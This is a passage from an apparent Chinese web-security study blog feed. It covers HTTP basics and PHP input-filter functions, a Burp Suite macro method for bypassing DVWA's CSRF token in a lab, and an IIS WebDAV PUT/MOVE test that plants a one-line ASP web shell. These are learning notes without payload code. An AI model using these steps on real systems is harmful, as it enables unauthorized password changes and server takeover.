10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36</span><br><span class="line">Accept  image/webp,image/*,*/*;q=0.8</span><br><span class="line">Referer http://www.imooc.com/</span><br><span class="line">Accept-Encoding gzip, deflate, sdch</span><br><span class="line">Accept-Language zh-CN,zh;q=0.8</span><br></pre></td></tr></table></figure><p><code>POST</code> 请求例子</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP1.1</span><br><span class="line"><span class="attribute">Host:www.wrox.com</span></span><br><span class="line">User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)</span><br><span class="line"><span class="attribute">Content-Type:application/x-www-form-urlencoded</span></span><br><span class="line"><span class="attribute">Content-Length:40</span></span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br><span class="line"></span><br><span class="line">name=Professional%20Ajax&amp;publisher=Wiley</span><br></pre></td></tr></table></figure><p>响应消息：状态行、消息包头、空行和响应正文。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Fri, 22 May 2009 06:07:21 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">      &lt;head&gt;&lt;/head&gt;</span><br><span class="line">      &lt;body&gt;</span><br><span class="line">            &lt;!--body goes here--&gt;</span><br><span class="line">      &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="HTTP之状态码"><a href="#HTTP之状态码" class="headerlink" title="HTTP之状态码"></a>HTTP之状态码</h4><table><thead><tr><th>状态码</th><th>作用</th></tr></thead><tbody><tr><td>1xx</td><td>请求已接受，继续处理</td></tr><tr><td>2xx</td><td>请求已被成功接收、理解、接收</td></tr><tr><td>3xx</td><td>重定向</td></tr><tr><td>4xx</td><td>请求有语法错误或请求无法实现</td></tr><tr><td>5xx</td><td>服务器为能实现合法请求</td></tr></tbody></table><h4 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h4><table><thead><tr><th>方法</th><th>作用</th></tr></thead><tbody><tr><td>GET</td><td>请求指定的页面信息，并返回实体主体</td></tr><tr><td>HEAD</td><td>返回响应中没有具体内容，用于获取报头</td></tr><tr><td>POST</td><td>向指定资源提交数据进行处理请求</td></tr><tr><td>PUT</td><td>从客户端向服务器传送的数据取代指定的文档内容</td></tr><tr><td>DELETE</td><td>请求服务器删除指定的页面</td></tr><tr><td>OPTION</td><td>允许客户端查看服务器的性能</td></tr><tr><td>TRACE</td><td>回显服务器收到的请求，主要用于测试或诊断</td></tr></tbody></table><p>浏览器地址输入 <code>URL</code> 后，经历流程：</p><ol><li>浏览器向 <code>DNS</code> 服务器请求解析该 <code>URL</code> 中的域名所对应的 <code>IP</code> 地址；</li><li>解析出 <code>IP</code> 地址后，根据 <code>IP</code> 地址和默认端口 <code>80</code> ，和服务器建立 <code>TCP</code> 连接；</li><li>浏览器发出读取文件的 <code>HTTP</code> 请求，该请求报文作为 <code>TCP</code> 三次握手的第三个报文数据发送给服务器。</li><li>服务器对浏览器请求作出响应，并把对应 <code>HTML</code> 文本发送给浏览器；</li><li>释放 <code>TCP</code> 连接；</li><li>浏览器将该 <code>HTML</code> 文本并显示内容。</li></ol><h4 id="GET和POST区别"><a href="#GET和POST区别" class="headerlink" title="GET和POST区别"></a>GET和POST区别</h4><p><code>GET</code> 请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/books/?sex=man&amp;name=Professional</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.wrox.com</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br></pre></td></tr></table></figure><p><code>POST</code> 请求</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.wrox.com</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 40</span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br><span class="line"></span><br><span class="line">name=Professional%20Ajax&amp;publisher=Wiley</span><br></pre></td></tr></table></figure><p>第一点：<code>GET</code> 提交，请求数据会附在 <code>URL</code> 之后，以 <code>?</code> 分割 <code>URL</code> 和传输数据，多个参数用 <code>&amp;</code> 连接。</p><p><code>POST</code> 提交，把提交数据放置在 <code>HTTP</code> 包的包体中；</p><p>第二点：<code>GET</code> 传输数据收到 <code>URL</code> 长度限制，<code>POST</code> 理论上不受限制；</p><p><em>参考文献</em></p><blockquote><p><a href="https://www.jianshu.com/p/80e25cb1d81a" target="_blank" rel="noopener">HTTP协议</a></p></blockquote><h3 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h3><h4 id="burpsuite使用"><a href="#burpsuite使用" class="headerlink" title="burpsuite使用"></a>burpsuite使用</h4><p>关于软件的使用可以参考 <em><a href="https://t0data.gitbooks.io/burpsuite/content/" target="_blank" rel="noopener">burpsuite实战指南</a></em> 一书。</p><h4 id="用burpsuite的宏绕过CSRF-TOKEN验证"><a href="#用burpsuite的宏绕过CSRF-TOKEN验证" class="headerlink" title="用burpsuite的宏绕过CSRF TOKEN验证"></a>用burpsuite的宏绕过CSRF TOKEN验证</h4><p>先打开 <code>firefox</code> 浏览器，登录账号，修改 <code>DVWA Security</code> 级别为 <code>High</code>。</p><p><img src="/images/54Highlevel.png" alt></p><p>然后进入到 <a href="http://192.168.253.133/dvwa/vulnerabilities/csrf/" target="_blank" rel="noopener">CSRF页面</a> </p><p><img src="/images/55csrfpage.png" alt></p><p>修改密码</p><p><img src="/images/56changepwd.png" alt></p><p>在 <code>HTTP history</code>中找到修改密码的请求包，发送到 <code>Repeater</code> 中，由于 <code>user_token</code> 已失效，密码修改失败， <code>HTTP</code> 状态码为 <code>302</code>，重定向到 <code>index.php</code> 页面。</p><p><img src="/images/58httphistory.png" alt></p><p><img src="/images/57repeaterFail.png" alt></p><p>接下来，开始使用宏绕过 <code>CSRF</code> 验证：</p><p><strong>第一步：录制宏</strong></p><p>在 <code>Project Option</code> 下 找到 <code>Sessions</code> ，然后找到底部的 <code>Macros</code> ，点击 <code>Add</code> 即创建一个新的宏。</p><p><img src="/images/59createNewMacros.png" alt></p><p>点击 <code>Add</code> 后会弹出一个新窗口</p><p><img src="/images/60macroRec.png" alt></p><p>在 <code>HTTP</code> 历史记录中选择 <code>/dvwa/vulnerabilities/csrf/</code> 在向应报文中找到 <code>user_token</code> 的值</p><p><img src="/images/61findtoken.png" alt></p><p>点击右下角 <code>OK</code> 后，进入 <code>Macro Editor</code> 界面</p><p><img src="/images/62macroEditor.png" alt> </p><p>修改 <code>Macro description</code> 为 <code>GET_CSRF_TOKEN</code> 点击右边 <code>Configure item</code></p><p><img src="/images/63item.png" alt></p><p><code>Parameter name</code> 改为 <code>user_token</code> 参数名与修改密码请求中的一致。用鼠标拖动选择 <code>user_token</code> 值，其余值会自动填充。点击 <code>OK</code> </p><p><img src="/images/64user_token.png" alt></p><p>完成后可以在宏列表中看到刚才录制的宏</p><p><img src="/images/65macroOK.png" alt></p><p><strong>第二步：添加会话处理规则</strong></p><p>完成后，在同一界面的 <code>Session Handling Rules</code> 点击 <code>Add</code> 弹出新界面</p><p><img src="/images/66session.png" alt></p><p>在新界面修改 <code>Rule Description</code> 为 <code>Update_CSRF_Token</code></p><p><img src="/images/67details.png" alt></p><p>点击 <code>Rule Actions</code> 选择 <code>GET_CSRF_TOKEN</code> ，然后选择 <code>Update only the following parameters</code> 选择 <code>user_token</code></p><p><img src="/images/68action.png" alt></p><p>选择好后，进入 <code>Session Handling</code> 选择 <code>Scope</code>界面，把修改密码的 <code>URL</code> 粘贴到 <code>URL Scope</code> 中</p><p><img src="/images/69scope.png" alt></p><p><strong>第三步：验证规则是否生效</strong></p><p>配置好后，返回到 <code>Repeater</code> 点击 <code>Go</code> 发现状态码 <code>200 OK</code></p><p><img src="/images/70200OK.png" alt></p><p>每点击一次，<code>user_tocken</code> 均不一样，密码可以修改成功。</p><p><img src="/images/71pwdChange.png" alt></p><p>后续进行宏维持会话有效</p><p><em>参考文献</em></p><blockquote><p><a href="https://www.freebuf.com/articles/web/156735.html" target="_blank" rel="noopener">经验分享|Burpsuite中宏的使用</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: &lt;code&gt;HTTP&lt;/code&gt; 内容总结，及 &lt;code&gt;burpsuite&lt;/code&gt; 软件的使用&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="HTTP - BurpSuite" scheme="http://yoursite.com/tags/HTTP-BurpSuite/"/>
    
  </entry>
  
  <entry>
    <title>练习8</title>
    <link href="http://yoursite.com/2019/08/20/practice8/"/>
    <id>http://yoursite.com/2019/08/20/practice8/</id>
    <published>2019-08-20T12:03:11.000Z</published>
    <updated>2019-08-21T15:16:03.501Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: <code>HTTP</code> 协议和 <code>HTTPS</code>协议的异同点， <code>HTTP</code> 协议中常见头部字段信息的含义及 <code>IIS</code> <code>PUT</code>写权限漏洞学习报告。</p><a id="more"></a><!--export--><ol><li><p>描述 <code>HTTP</code> 协议和 <code>HTTPS</code> 协议的异同点</p><p>相同点：HTTP 和 HTTPS 都采用同一个基础的协议。HTTPS并非是一种新协议，只是HTTP通信接口部分用SSL和TLS协议代替而已。HTTPS就是身披SSL协议外壳的HTTP。</p><p>不同点</p><table><thead><tr><th>名称</th><th>不同点</th></tr></thead><tbody><tr><td>安全性</td><td>HTTP不安全，HTTPS安全；HTTP无需证书，无需加密，HTTPS需要证书需要加密</td></tr><tr><td>端口号</td><td>HTTP标准端口是80，HTTPS是443</td></tr><tr><td>所处层</td><td>HTTP工作与应用层，HTTPS工作与传输层</td></tr><tr><td>URL</td><td>HTTP以http://开头，HTTPS以https://开头</td></tr><tr><td>通信</td><td>HTTP直接和TCP通信，HTTPS写和SSL通信，再由SSL和TCP通信。</td></tr></tbody></table><p><em>参考文献</em></p><blockquote><p><a href="https://www.oschina.net/translate/http-vs-https-similarities-and-differences" target="_blank" rel="noopener">HTTP和HTTPS异同点</a></p><p>《图解HTTP》</p></blockquote></li></ol><ol start="2"><li><p>描述 <code>HTTP</code> 协议中，常见头部字段信息含义。</p><p><strong>请求首部字段</strong></p><table><thead><tr><th>请求首部字段</th><th>含义</th></tr></thead><tbody><tr><td>Accept</td><td>通知服务器，用户能够处理的媒体类型及媒体类型的相对优先级。</td></tr><tr><td>Accept-Charset</td><td>通知服务器用户代理支持的字符集及字符集的相对优先顺序。</td></tr><tr><td>Authorization</td><td>告知服务器，用户代理的认证信息。</td></tr><tr><td>Expect</td><td>告知服务器，期望出现的某种特定行为。</td></tr><tr><td>From</td><td>告知服务器使用用户代理的电子邮件地址。</td></tr><tr><td>Host</td><td>告知服务器，请求资源所处的互联网的主机名和端口号。</td></tr><tr><td>Proxy-Authorization</td><td>告知服务器认证所需要的信息。</td></tr><tr><td>Range</td><td>告知服务器资源的指定范围。</td></tr><tr><td>Referer</td><td>告知服务器请求的原始资源的URI</td></tr><tr><td>User-Agent</td><td>将创建请求的浏览器和用户代理名称等信息传达给服务器。</td></tr></tbody></table><p><strong>响应首部字段</strong></p><table><thead><tr><th>响应首部字段</th><th>含义</th></tr></thead><tbody><tr><td>Accept-Ranges</td><td>告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。</td></tr><tr><td>Age</td><td>告知客户端，源服务器在多久前创建了响应。</td></tr><tr><td>ETag</td><td>告知客户端实体标识。</td></tr><tr><td>Location</td><td>响应接收方引导至某个与请求URI位置不同的资源。</td></tr><tr><td>Proxy-Authenticate</td><td>由代理服务器所要求的认证信息发送给客户端。</td></tr><tr><td>Retry-After</td><td>告知客户端应该在多久之后再次发送请求。</td></tr><tr><td>Server</td><td>告知客户端当前服务器上安装的HTTP服务器应用程序的信息。</td></tr><tr><td>Vary</td><td>可对缓存进行控制。</td></tr><tr><td>WWW-Authenticate</td><td>用于HTTP访问认证。</td></tr></tbody></table></li><li><p><code>IIS</code> <code>put</code> 写权限漏洞</p><p>打开<code>VMware</code>虚拟机，先查看 <code>IP</code> 地址</p></li></ol><p><img src="/images/38Ipaddr.png" alt></p><p>​    主机访问网站</p><p><img src="/images/39show.png" alt></p><p>​        <code>WebDAV</code> 开启之前</p><p><img src="/images/40WebDaVClose.png" alt></p><p>​    使用 <code>burpsuite</code> 抓取数据包，将 <code>GET</code> 方法改为 <code>OPTIONS</code> 后，</p><p><img src="/images/41close.png" alt></p><p>​    开启 <code>WebDAV</code> 服务，</p><p><img src="/images/42open.png" alt></p><p>​    使用 <code>burpsuite</code> 抓取数据包，将 <code>GET</code> 方法改为 <code>OPTIONS</code> 后，</p><p><img src="/images/43openbp.png" alt></p><p>​    文件所在文件夹的写权限未开启前</p><p><img src="/images/44nowrite.png" alt></p><p>​    使用 <code>PUT</code> 写入文件</p><p><img src="/images/45fail.png" alt></p><p>​    文件所在文件夹的写权限开启</p><p><img src="/images/46write.png" alt></p><p>​    使用 <code>PUT</code> 写入文件</p><p><img src="/images/47success.png" alt></p><p>​    进入目录查看，可以找到 <code>test.txt</code> 文件</p><p><img src="/images/48testOK.png" alt></p><p>​    先将一句话木马写入 <code>test.txt</code> 中</p><p><img src="/images/49rom.png" alt></p><p>​        查看 <code>test.txt</code></p><p><img src="/images/50rom.png" alt></p><p>​    将 脚本资源访问 打上勾</p><p><img src="/images/51script.png" alt></p><p>​    在用 <code>MOVE</code> 将 <code>test.txt</code> 修改为 <code>test.asp</code></p><p> <img src="/images/52createAsp.png" alt></p><p>​    查看 <code>test.asp</code></p><p><img src="/images/53show.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: &lt;code&gt;HTTP&lt;/code&gt; 协议和 &lt;code&gt;HTTPS&lt;/code&gt;协议的异同点， &lt;code&gt;HTTP&lt;/code&gt; 协议中常见头部字段信息的含义及 &lt;code&gt;IIS&lt;/code&gt; &lt;code&gt;PUT&lt;/code&gt;写权限漏洞学习报告。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="HTTP" scheme="http://yoursite.com/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>note26</title>
    <link href="http://yoursite.com/2019/08/20/note26/"/>
    <id>http://yoursite.com/2019/08/20/note26/</id>
    <published>2019-08-20T11:12:56.000Z</published>
    <updated>2019-08-21T15:05:23.233Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 针对 <code>HTTP</code>的协议基础进行了简单的学习，掌握 <code>HTTP</code> 相关内容， 安装 <code>burpsuite</code> 软件，熟练使用该软件。对 <code>PDO</code>模式下防止 <code>SQL</code> 注入的理解。</p><a id="more"></a><!--export--><!--toc--><h3 id="HTTP协议基础"><a href="#HTTP协议基础" class="headerlink" title="HTTP协议基础"></a>HTTP协议基础</h3><h4 id="计算机网络模型基础"><a href="#计算机网络模型基础" class="headerlink" title="计算机网络模型基础"></a>计算机网络模型基础</h4><p><code>OSI</code> 模型总共分为七层，从下到上分别是：物理层、数据链路层、网络层、运输层、会话层、表示层和应用层。</p><p><code>TCP/IP</code> 模型分为五层，从下到上是：物理层、链路层、网络层、运输层和应用层。</p><ul><li><code>OSI</code>模型和 <code>TCP/IP</code> 模型</li></ul><table><thead><tr><th><code>OSI</code> 模型</th><th><code>TCP/IP</code> 模型</th><th>各层的解释</th></tr></thead><tbody><tr><td>应用层</td><td>应用层</td><td>为应用程序提供服务</td></tr><tr><td>表示层</td><td>应用层</td><td>数据格式转化、数据加密</td></tr><tr><td>会话层</td><td>应用层</td><td>建立、管理和维护会话</td></tr><tr><td>传输层</td><td>传输层</td><td>建立、管理和维护端到端的连接</td></tr><tr><td>网络层</td><td>网络层</td><td><code>IP</code> 选址及路由选择</td></tr><tr><td>数据链路层</td><td>数据链路层</td><td>提供介质访问和链路管理</td></tr><tr><td>物理层</td><td>物理层</td><td>物理层</td></tr></tbody></table><ul><li>过程如下：</li></ul><ol><li>应用层数据，先按照运输层协议标准，封装到运输层数据里（数据段）；</li><li>接着运输层的数据，会按照网络层协议的标准，封装到网络层数据里（数据包/报文）；</li><li>接着这些数据包会按照链路层的协议标准，封装链路层数据里（帧）；</li><li>这些数据帧，按照物理层的电气特性，转换为网络中 <code>0101</code>比特流发送出去</li><li>网络会把这些流数据，不断地拆封再拆封，直到送到目标主机，然后由目标主机一层一层拆封数据，进行反解析，最终完成一次数据传递。</li></ol><table><thead><tr><th>层数</th><th>作用</th></tr></thead><tbody><tr><td>物理层</td><td>规定电气特性。如调制解调器、光导纤维等</td></tr><tr><td>数据链路层</td><td>有 <code>ARQ</code> 、<code>PPP</code>等协议，数据单元为帧，典型设备有：网卡/网桥/交换机</td></tr><tr><td>网络层</td><td>有<code>IP</code>/<code>ICMP</code>等协议，数据单元为数据包，典型设备为：路由器/防火墙/多层交换机</td></tr><tr><td>传输层</td><td>有<code>TCP</code>/<code>UDP</code>等协议，数据单元为数据段，典型设备有：进程和端口</td></tr><tr><td>应用层</td><td>有<code>DHCP</code>/<code>FTP</code>/<code>HTTP</code>等协议，典型设备有：应用程序(<code>FTP</code>/<code>SMTP</code>/<code>HTTP</code>)</td></tr></tbody></table><p>越往高走，越偏向软件化。</p><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p><code>HTTP</code> 协议是超文本传输（转移）协议，基于 <code>TCP/IP</code> 通信协议来传递数据，是一个属于应用层的面向对象的协议。</p><p> 常用状态码</p><table><thead><tr><th>状态码</th><th>意义</th></tr></thead><tbody><tr><td>200 OK</td><td>从客户端发来的请求在服务器端被正常处理</td></tr><tr><td>204 No Content</td><td>服务器接收的请求已成功处理，但在返回响应报文中不含实体的主体部分</td></tr><tr><td>301 Moved Permanently</td><td>永久性重定向</td></tr><tr><td>302 Found</td><td>临时性重定向</td></tr><tr><td>304 Not Modified</td><td>客户端发送附带条件请求时，服务器端允许请求访问资源，但未满足条件的情况</td></tr><tr><td>400 Bad Request</td><td>请求报文中存在语法错误</td></tr><tr><td>403 Forbidden</td><td>对请求资源的访问被服务器拒绝</td></tr><tr><td>404 Not Found</td><td>服务器上无法找到请求的资源</td></tr><tr><td>500 Internal Server Error</td><td>服务器端在执行请求时发生了错误</td></tr></tbody></table><h3 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h3><p>使用burpsuite抓取新闻管理系统的数据包</p><p>新闻初始界面</p><p><img src="/images/25bpindex.png" alt></p><p>点击 <code>forward</code></p><p><img src="/images/26bpindex.png" alt></p><p>点击用户界面</p><p><img src="/images/29bplogup.png" alt></p><p>注册成功后，登录</p><p><img src="/images/32bpjumpindex.png" alt></p><p>评论</p><p><img src="/images/33bpshowNews.png" alt></p><p>读取新闻</p><p><img src="/images/35bpreadNews.png" alt></p><p>进入个人信息页面</p><p><img src="/images/37bpPerInfo.png" alt></p><h3 id="PDO模式下防止SQL注入"><a href="#PDO模式下防止SQL注入" class="headerlink" title="PDO模式下防止SQL注入"></a>PDO模式下防止SQL注入</h3><p>使用 <code>PDO</code> 的 <code>prepare</code> 方式，主要是提高 <code>SQL</code> 模板查询性能、阻止 <code>SQL</code> 注入。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 针对 &lt;code&gt;HTTP&lt;/code&gt;的协议基础进行了简单的学习，掌握 &lt;code&gt;HTTP&lt;/code&gt; 相关内容， 安装 &lt;code&gt;burpsuite&lt;/code&gt; 软件，熟练使用该软件。对 &lt;code&gt;PDO&lt;/code&gt;模式下防止 &lt;code&gt;SQL&lt;/code&gt; 注入的理解。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="HTTP" scheme="http://yoursite.com/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>PHP内置过滤函数</title>
    <link href="http://yoursite.com/2019/08/17/php-file-func/"/>
    <id>http://yoursite.com/2019/08/17/php-file-func/</id>
    <published>2019-08-17T08:42:07.000Z</published>
    <updated>2019-08-17T09:41:29.946Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 本周写的新闻管理系统未对用户输入做出相应的判断，存在大量的漏洞，这篇文章特地总结了<code>php</code>内置过滤函数。</p><a id="more"></a><!--export--><h3 id="一、SQL注入过滤函数"><a href="#一、SQL注入过滤函数" class="headerlink" title="一、SQL注入过滤函数"></a>一、SQL注入过滤函数</h3><h4 id="1-addslashes"><a href="#1-addslashes" class="headerlink" title="1. addslashes()"></a>1. addslashes()</h4><p><strong>定义和用法</strong></p><p><code>addslashes(string)</code>函数返回在预定义的字符前添加反斜杠的字符串。</p><p>预定义字符是：</p><ul><li><p>单引号(‘)</p></li><li><p>双引号(“)</p></li><li><p>反斜杠()</p></li><li><p>NULL</p></li></ul><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要转移的字符串。</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    $id=$_GET[<span class="string">"id"</span>];</span><br><span class="line">    $str = addslashes($id);</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/18addslashes.png" alt></p><h4 id="2-mysql-escape-string"><a href="#2-mysql-escape-string" class="headerlink" title="2. mysql_escape_string()"></a>2. mysql_escape_string()</h4><blockquote><p>在PHP5.3中已经弃用mysql_escape_string()</p></blockquote><p><code>mysql_escape_string()</code>并不转义<code>%</code>和<code>_</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">$id=$_GET[<span class="string">"id"</span>];</span><br><span class="line">@$str = mysql_escape_string($id);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/19mysqlEscapeStr.png" alt></p><h4 id="3-mysql-real-escape-string"><a href="#3-mysql-real-escape-string" class="headerlink" title="3. mysql_real_escape_string()"></a>3. mysql_real_escape_string()</h4><p><strong>定义和用法</strong></p><p><code>mysql_real_escape_string(str, con)</code>函数转义SQL语句中使用的字符串中的特殊字符。</p><p>受影响的字符：</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a</li></ul><p>若成功，返回被转义的字符串，否则，返回<code>false</code>。</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要转义的字符串。</td></tr><tr><td>connection</td><td>可选。规定MySQL连接。未规定，则使用上一个连接。</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$id=$_GET[<span class="string">"id"</span>];</span><br><span class="line"><span class="keyword">if</span>(@$str = mysql_real_escape_string($id))</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'false'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/20mysqlRealEscapeStr.png" alt></p><h3 id="二、XSS过滤函数"><a href="#二、XSS过滤函数" class="headerlink" title="二、XSS过滤函数"></a>二、XSS过滤函数</h3><h4 id="1-htmlspecialchars"><a href="#1-htmlspecialchars" class="headerlink" title="1. htmlspecialchars()"></a>1. htmlspecialchars()</h4><p><strong>定义和用法</strong></p><p><code>htmlspecialchars()</code>函数把预定义的字符转换成<code>HTML</code>实体。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$id=$_GET[<span class="string">"id"</span>];</span><br><span class="line">$str = htmlspecialchars($id);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要转义的字符串。</td></tr></tbody></table><p><img src="/images/21htmlspecialchars.png" alt></p><h4 id="2-strip-tag-函数"><a href="#2-strip-tag-函数" class="headerlink" title="2. strip_tag()函数"></a>2. strip_tag()函数</h4><p><strong>定义和用法</strong></p><p><code>strip_tags(string, allow)</code> 函数剥去字符串中的<code>HTML</code>、<code>XML</code> 以及<code>PHP</code>的标签。</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要检查的字符串。</td></tr><tr><td>allow</td><td>可选。规定允许的标签。这些标签不会被删除。</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$id=$_GET[<span class="string">"id"</span>];</span><br><span class="line">$str = strip_tags($id);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/22stripTags.png" alt></p><h3 id="三、命令执行过滤函数"><a href="#三、命令执行过滤函数" class="headerlink" title="三、命令执行过滤函数"></a>三、命令执行过滤函数</h3><h4 id="1-escapeshellcmd"><a href="#1-escapeshellcmd" class="headerlink" title="1. escapeshellcmd()"></a>1. escapeshellcmd()</h4><p><strong>定义和用法</strong></p><p>在Windows下过滤方式是在字符前面加上一个^符号；在Linux是在字符前加上反斜杠（\）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$id=$_GET[<span class="string">"id"</span>];</span><br><span class="line">$str = escapeshellcmd($id);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/23escapeshellcmd.png" alt></p><h4 id="2-escapeshellarg"><a href="#2-escapeshellarg" class="headerlink" title="2. escapeshellarg()"></a>2. escapeshellarg()</h4><p><strong>定义和用法</strong></p><p>给所有参数加上一对双引号，强制为字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 